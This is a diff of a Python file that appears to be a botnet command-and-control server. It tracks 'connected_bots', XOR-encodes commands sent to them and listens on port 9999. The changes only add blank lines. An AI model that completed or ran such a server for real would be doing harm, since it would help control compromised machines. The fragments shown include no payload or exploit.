@@ -20,14 +20,17 @@ XOR_KEY = 0x42
 connected_bots = []  # Shared state for all bot connections
 log_lock = threading.Lock()
 
+
 def log_event(message):
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with log_lock:
         print(f"[{timestamp}] {message}")
 
+
 def xor_encrypt(cmd: str) -> bytes:
     # Simple XOR encoding for commands
     return bytes([ord(c) ^ XOR_KEY for c in cmd])
+
 
 def handle_client(client_socket, address):
     try:
@@ -81,6 +84,7 @@ def handle_client(client_socket, address):
         connected_bots = [b for b in connected_bots if b['ip'] != address[0]]
         client_socket.close()
         log_event(f"Disconnected: {address[0]}:{address[1]}")
+
 
 def start_server(host='0.0.0.0', port=9999):
     global connected_bots
